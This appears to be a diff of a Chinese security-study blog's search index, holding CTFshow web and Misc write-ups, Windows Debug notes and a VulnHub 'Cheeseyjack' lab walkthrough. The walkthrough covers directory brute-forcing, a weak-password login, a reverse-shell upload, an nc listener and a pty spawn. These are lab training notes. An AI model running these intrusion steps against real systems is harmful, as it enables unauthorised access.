@@ -1,28 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTFshow 萌新web1-8</title>
-    <url>/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/</url>
-    <content><![CDATA[<h2 id="萌新区web1"><a href="#萌新区web1" class="headerlink" title="萌新区web1"></a>萌新区web1</h2><p>web选手培养中……<br>CTFshow这个平台简直不要太赞，以后刷题就在这里了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.0.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.1.png"><br>既然没有漏洞那我就不做了吧（滑稽）<br>这个注释，可以说很照顾萌新了</p>
+    <title>CTFshow-Misc入门-图片篇</title>
+    <url>/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/</url>
+    <content><![CDATA[<p>什么？又出新题了<br>还有一堆web没做，你怎么跑到Misc来摸鱼了？(大雾)<br>这个系列学累了偶尔来做一做，更新随缘~</p>
+<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>解压完直接打开即可<br>不会有人傻到一个一个对着打flag吧？不会吧不会吧？<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.png"></p>
 <span id="more"></span>
-<p>flag in id=1000  flag已经告诉我们在哪里了，所以我们只需要用sql执行语句查找就行了<br>直接大于999会出现错误提示<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.2.png"><br>所以我们给它加点料嘻嘻(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.3.png"><br>后来想了想，应该不止一种解法 应该还可以用十六进制（用0x3e8绕过）<br>用十六进制就好比试卷上的计算题1+1+=？答案那里你写了个two类似吧~<br>（当然解法也能用二进制，也可以用别的方法）</p>
-<h2 id="萌新区web2"><a href="#萌新区web2" class="headerlink" title="萌新区web2"></a>萌新区web2</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.1.png"><br>应该还是有问题的（）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.2.png"><br>看着跟web1差不多嘛…<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.3.png"><br>所以这跟web1有什么区别吗？？</p>
-<h2 id="萌新区web3"><a href="#萌新区web3" class="headerlink" title="萌新区web3"></a>萌新区web3</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.1.png"><br>没问题吗？我不信233333<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.2.png"><br>没有过滤【‘’】 所以……(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.3.png"><br>这跟web1 web2 有什么区别吗？</p>
-<h2 id="萌新区web4"><a href="#萌新区web4" class="headerlink" title="萌新区web4"></a>萌新区web4</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.1.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.2.png"><br>依然可以用【‘’】 不多说了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.3.png"></p>
-<h2 id="萌新区web5"><a href="#萌新区web5" class="headerlink" title="萌新区web5"></a>萌新区web5</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.1.png"><br>痛下杀手可还行<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.2.png"><br>这次多加了正则匹配，不能用?id=’1000’来解题了<br>可以使用【^】按位异或来绕过<br>1000的二进制是1111101000<br>只要找两个按位异或就行了，比如1111100000（992）和1000（8）</p>
-<h2 id="萌新区web6"><a href="#萌新区web6" class="headerlink" title="萌新区web6"></a>萌新区web6</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.1.png"><br>我猜这回不能按位异或了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.2.png"><br>果然……<br>不过不能按位异或，我们还可以取反呀~~<br>~~（双重含义）（笑）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.3.png"></p>
-<h2 id="萌新区web7"><a href="#萌新区web7" class="headerlink" title="萌新区web7"></a>萌新区web7</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.1.png"><br>我猜取反也给过滤了<br>如果取反也过滤了，就只能输入1111101000惹<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.2.png"><br>恩 我们输入二进制的1000 开头加上【0b】表示是二进制<br>1+1=two？这谁写的答案啊（恼）<br>……算了也算对的吧 放你一马<br>大概是这样子的（雾）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.3.png"></p>
-<h2 id="萌新区web8"><a href="#萌新区web8" class="headerlink" title="萌新区web8"></a>萌新区web8</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.1.png"><br>0.0    哦豁？被辞职了？<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.2.png"><br>这个代码……emmmmm<br>看了一眼write up  好家伙，阿呆删库跑路了 无形玩梗最为致命hhh<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.3.png"></p>
-<blockquote>
-<blockquote>
-<p>现在是2020年1月10日 0:19 萌新专区web1-8【阿呆第一季】结束了<br>毫无睡意，但是不是很想写web了  所以干点别的去(#^.^#)<br>不出意外接下来几天会写点别的 web暂时这样吧~~</p>
-</blockquote>
-</blockquote>
-<hr>
-<p>这是放寒假的时候从1月9日-1月10日做的萌新web题，现在把这个write up作为我在博客上的第一篇文章摆在这里，markdown语法一点也不难，纯粹为了写文章服务。非常非常赞！写write up也算是为我学习添了一点动力。希望自己能坚持下去吧！</p>
+<p><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.1.png"></p>
+<h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h3><p>打开txt发现是一堆乱码<br>看到文件头的字样推断是png图像<br>修改后缀格式即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.png"><br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.1.png"></p>
+<h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h3><p>用bgp查看软件打开即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/3.png"></p>
+<h3 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h3><p>一张一张的看<br>这种题什么也不考察 纯粹耍猴<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/4.png"></p>
+<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc 5"></a>Misc 5</h3><p>010 editor打开搜索ctf字样即可发现最后几行有flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/5.png"></p>
+<h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc 6"></a>Misc 6</h3><p>没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/6.png"></p>
+<h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc 7"></a>Misc 7</h3><p>也没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/7.png"></p>
+<h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h3><p>里面还藏着一个图片<br>binwalk或者手动提取图片即可<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/8.png"></p>
+<h3 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h3><p>还是没什么好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/9.png"></p>
+<h3 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h3><p>binwalk一把梭<br>打开其中一个文件可以发现flag</p>
 <hr>
 <blockquote>
-<p>阳光下的泡沫，是彩色的。</p>
+<p>生活不是选择，而是热爱。或许你我终将落俗，但浪漫至死不渝。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -153,24 +149,28 @@
       </tags>
   </entry>
   <entry>
-    <title>CTFshow-Misc入门-图片篇</title>
-    <url>/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/</url>
-    <content><![CDATA[<p>什么？又出新题了<br>还有一堆web没做，你怎么跑到Misc来摸鱼了？(大雾)<br>这个系列学累了偶尔来做一做，更新随缘~</p>
-<h2 id="图片篇-基础操作"><a href="#图片篇-基础操作" class="headerlink" title="图片篇(基础操作)"></a>图片篇(基础操作)</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h3><p>解压完直接打开即可<br>不会有人傻到一个一个对着打flag吧？不会吧不会吧？<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.png"></p>
+    <title>CTFshow 萌新web1-8</title>
+    <url>/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/</url>
+    <content><![CDATA[<h2 id="萌新区web1"><a href="#萌新区web1" class="headerlink" title="萌新区web1"></a>萌新区web1</h2><p>web选手培养中……<br>CTFshow这个平台简直不要太赞，以后刷题就在这里了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.0.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.1.png"><br>既然没有漏洞那我就不做了吧（滑稽）<br>这个注释，可以说很照顾萌新了</p>
 <span id="more"></span>
-<p><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/1.1.png"></p>
-<h3 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h3><p>打开txt发现是一堆乱码<br>看到文件头的字样推断是png图像<br>修改后缀格式即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.png"><br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/2.1.png"></p>
-<h3 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc 3"></a>Misc 3</h3><p>用bgp查看软件打开即可得到flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/3.png"></p>
-<h3 id="Misc-4"><a href="#Misc-4" class="headerlink" title="Misc 4"></a>Misc 4</h3><p>一张一张的看<br>这种题什么也不考察 纯粹耍猴<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/4.png"></p>
-<h2 id="图片篇-信息附加"><a href="#图片篇-信息附加" class="headerlink" title="图片篇(信息附加)"></a>图片篇(信息附加)</h2><h3 id="Misc-5"><a href="#Misc-5" class="headerlink" title="Misc 5"></a>Misc 5</h3><p>010 editor打开搜索ctf字样即可发现最后几行有flag<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/5.png"></p>
-<h3 id="Misc-6"><a href="#Misc-6" class="headerlink" title="Misc 6"></a>Misc 6</h3><p>没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/6.png"></p>
-<h3 id="Misc-7"><a href="#Misc-7" class="headerlink" title="Misc 7"></a>Misc 7</h3><p>也没啥好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/7.png"></p>
-<h3 id="Misc-8"><a href="#Misc-8" class="headerlink" title="Misc 8"></a>Misc 8</h3><p>里面还藏着一个图片<br>binwalk或者手动提取图片即可<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/8.png"></p>
-<h3 id="Misc-9"><a href="#Misc-9" class="headerlink" title="Misc 9"></a>Misc 9</h3><p>还是没什么好说的<br><img src="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/9.png"></p>
-<h3 id="Misc-10"><a href="#Misc-10" class="headerlink" title="Misc 10"></a>Misc 10</h3><p>binwalk一把梭<br>打开其中一个文件可以发现flag</p>
+<p>flag in id=1000  flag已经告诉我们在哪里了，所以我们只需要用sql执行语句查找就行了<br>直接大于999会出现错误提示<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.2.png"><br>所以我们给它加点料嘻嘻(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/1.3.png"><br>后来想了想，应该不止一种解法 应该还可以用十六进制（用0x3e8绕过）<br>用十六进制就好比试卷上的计算题1+1+=？答案那里你写了个two类似吧~<br>（当然解法也能用二进制，也可以用别的方法）</p>
+<h2 id="萌新区web2"><a href="#萌新区web2" class="headerlink" title="萌新区web2"></a>萌新区web2</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.1.png"><br>应该还是有问题的（）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.2.png"><br>看着跟web1差不多嘛…<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/2.3.png"><br>所以这跟web1有什么区别吗？？</p>
+<h2 id="萌新区web3"><a href="#萌新区web3" class="headerlink" title="萌新区web3"></a>萌新区web3</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.1.png"><br>没问题吗？我不信233333<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.2.png"><br>没有过滤【‘’】 所以……(#^.^#)<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/3.3.png"><br>这跟web1 web2 有什么区别吗？</p>
+<h2 id="萌新区web4"><a href="#萌新区web4" class="headerlink" title="萌新区web4"></a>萌新区web4</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.1.png"><br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.2.png"><br>依然可以用【‘’】 不多说了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/4.3.png"></p>
+<h2 id="萌新区web5"><a href="#萌新区web5" class="headerlink" title="萌新区web5"></a>萌新区web5</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.1.png"><br>痛下杀手可还行<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/5.2.png"><br>这次多加了正则匹配，不能用?id=’1000’来解题了<br>可以使用【^】按位异或来绕过<br>1000的二进制是1111101000<br>只要找两个按位异或就行了，比如1111100000（992）和1000（8）</p>
+<h2 id="萌新区web6"><a href="#萌新区web6" class="headerlink" title="萌新区web6"></a>萌新区web6</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.1.png"><br>我猜这回不能按位异或了<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.2.png"><br>果然……<br>不过不能按位异或，我们还可以取反呀~~<br>~~（双重含义）（笑）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/6.3.png"></p>
+<h2 id="萌新区web7"><a href="#萌新区web7" class="headerlink" title="萌新区web7"></a>萌新区web7</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.1.png"><br>我猜取反也给过滤了<br>如果取反也过滤了，就只能输入1111101000惹<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.2.png"><br>恩 我们输入二进制的1000 开头加上【0b】表示是二进制<br>1+1=two？这谁写的答案啊（恼）<br>……算了也算对的吧 放你一马<br>大概是这样子的（雾）<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/7.3.png"></p>
+<h2 id="萌新区web8"><a href="#萌新区web8" class="headerlink" title="萌新区web8"></a>萌新区web8</h2><p><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.1.png"><br>0.0    哦豁？被辞职了？<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.2.png"><br>这个代码……emmmmm<br>看了一眼write up  好家伙，阿呆删库跑路了 无形玩梗最为致命hhh<br><img src="/2021/01/09/CTFshow-%E8%90%8C%E6%96%B0web1-8/8.3.png"></p>
+<blockquote>
+<blockquote>
+<p>现在是2020年1月10日 0:19 萌新专区web1-8【阿呆第一季】结束了<br>毫无睡意，但是不是很想写web了  所以干点别的去(#^.^#)<br>不出意外接下来几天会写点别的 web暂时这样吧~~</p>
+</blockquote>
+</blockquote>
+<hr>
+<p>这是放寒假的时候从1月9日-1月10日做的萌新web题，现在把这个write up作为我在博客上的第一篇文章摆在这里，markdown语法一点也不难，纯粹为了写文章服务。非常非常赞！写write up也算是为我学习添了一点动力。希望自己能坚持下去吧！</p>
 <hr>
 <blockquote>
-<p>生活不是选择，而是热爱。或许你我终将落俗，但浪漫至死不渝。</p>
+<p>阳光下的泡沫，是彩色的。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -238,7 +238,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.55.134/project_management -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/12.png"><br>访问一下。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/13.png"><br>在databases.yml发现了点信息。不管有用没有，收集起来再说。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/14.png"><br>试着用enum4linux看看能不能收集到啥【enum4linux是Kali Linux自带的一款信息收集工具】</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#99;&#x68;&#x33;&#x33;&#x73;&#51;&#109;&#52;&#110;&#64;&#99;&#104;&#x65;&#x65;&#x73;&#x65;&#x79;&#106;&#x61;&#x63;&#x6b;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;">&#99;&#x68;&#x33;&#x33;&#x73;&#51;&#109;&#52;&#110;&#64;&#99;&#104;&#x65;&#x65;&#x73;&#x65;&#x79;&#106;&#x61;&#x63;&#x6b;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
+<p><img src="/2021/07/22/Cheesey-Cheeseyjack/15.png"><br>收集到了两个用户，很重要！记起来！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/16.png"><br>结合刚才收集到的信息来看1.密码弱口令 2.登录邮箱的格式就是网页Contact me给出的格式 3.邮箱是两个用户名其中的一个<br>经过几番尝试后，成功登入。<br>用户：<a href="mailto:&#x63;&#x68;&#x33;&#x33;&#115;&#51;&#x6d;&#x34;&#110;&#64;&#99;&#x68;&#x65;&#x65;&#115;&#101;&#x79;&#x6a;&#97;&#x63;&#x6b;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;">&#x63;&#x68;&#x33;&#x33;&#115;&#51;&#x6d;&#x34;&#110;&#64;&#99;&#x68;&#x65;&#x65;&#115;&#101;&#x79;&#x6a;&#97;&#x63;&#x6b;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;</a><br>密码：qdpm      #就是那个CMS的名字，登录界面有显示。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/17.png"><br>登录后发现有一处文件上传，而且毫无限制，那还等什么？直接安排上！！<br><img src="/2021/07/22/Cheesey-Cheeseyjack/18.png"><br>我这里上传的是一个反弹shell脚本。去搜一下都能找到，我就不贴出来了。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/19.png"><br>上传后，kali开启监听端口</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1111</span><br></pre></td></tr></table></figure>
 <p><img src="/2021/07/22/Cheesey-Cheeseyjack/20.png"><br>刚才收集到了uploads文件夹，找到shell.php点击即可。<br>![](21 (2).png)<br><img src="/2021/07/22/Cheesey-Cheeseyjack/21.png"><br>因为自带有python3环境【可以用which python找路径】<br>所以这里还可以打一个反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
@@ -462,6 +462,40 @@
       </tags>
   </entry>
   <entry>
+    <title>尝试接触Windows Debug</title>
+    <url>/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/</url>
+    <content><![CDATA[<p>最近在努力接触汇编，同学时刻告诫我要多动手，这篇笔记便是动手的证明。</p>
+<p>感谢某位小天才的督促^_^</p>
+<hr>
+<h1 id="Debug是什么？"><a href="#Debug是什么？" class="headerlink" title="Debug是什么？"></a>Debug是什么？</h1><p>debug是Windows 16位或者32位机器上的一款调试工具。</p>
+<p>也就是说64位是没有滴~</p>
+<p>本次学习环境为Windows 2003  进入cmd后输入debug即可。</p>
+<h1 id="初识Debug"><a href="#初识Debug" class="headerlink" title="初识Debug"></a>初识Debug</h1><p>debug /?</p>
+<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/1.png"></p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r 显示当前所有寄存器和标志位的状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a 在内存中直接编写代码</span><br></pre></td></tr></table></figure>
+
+<p>输入汇编指令后跟段地址:偏移地址（例：a 0000:0100）</p>
+<p>回车之后就可以输入了，停止输入时按Enter键即可</p>
+<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/3.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d 显示存储器内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/4.png"></p>
+<p>没修改之前的</p>
+<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/5.png"></p>
+]]></content>
+      <categories>
+        <category>我的pwn学习之路</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>强大工具wmic的学习记录</title>
     <url>/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>Windows 系统自带的 wmic 命令——内网大杀器！</p>
@@ -519,40 +553,6 @@
       </tags>
   </entry>
   <entry>
-    <title>尝试接触Windows Debug</title>
-    <url>/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/</url>
-    <content><![CDATA[<p>最近在努力接触汇编，同学时刻告诫我要多动手，这篇笔记便是动手的证明。</p>
-<p>感谢某位小天才的督促^_^</p>
-<hr>
-<h1 id="Debug是什么？"><a href="#Debug是什么？" class="headerlink" title="Debug是什么？"></a>Debug是什么？</h1><p>debug是Windows 16位或者32位机器上的一款调试工具。</p>
-<p>也就是说64位是没有滴~</p>
-<p>本次学习环境为Windows 2003  进入cmd后输入debug即可。</p>
-<h1 id="初识Debug"><a href="#初识Debug" class="headerlink" title="初识Debug"></a>初识Debug</h1><p>debug /?</p>
-<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/1.png"></p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r 显示当前所有寄存器和标志位的状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a 在内存中直接编写代码</span><br></pre></td></tr></table></figure>
-
-<p>输入汇编指令后跟段地址:偏移地址（例：a 0000:0100）</p>
-<p>回车之后就可以输入了，停止输入时按Enter键即可</p>
-<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/3.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d 显示存储器内容</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/4.png"></p>
-<p>没修改之前的</p>
-<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/5.png"></p>
-]]></content>
-      <categories>
-        <category>我的pwn学习之路</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>我的pwn学习之路——第二天</title>
     <url>/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
     <content><![CDATA[<p>几天不摸，感觉又回到解放前了。</p>
@@ -600,85 +600,6 @@
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络安全应急响应Linux篇</title>
-    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
-    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
-<p>算是自己看书和学习的一个总结和整理。这里是对Linux的小总结</p>
-<p>【正在更新中,其实大部分需要掌握的基础部分写的差不多了，虽然坑没填完但也够看了】</p>
-<h1 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h1><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><h3 id="cpu信息"><a href="#cpu信息" class="headerlink" title="cpu信息"></a>cpu信息</h3><p>【lscpu】命令可查看cpu相关信息，包括型号、主频、内核等</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/1.png"></p>
-<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-
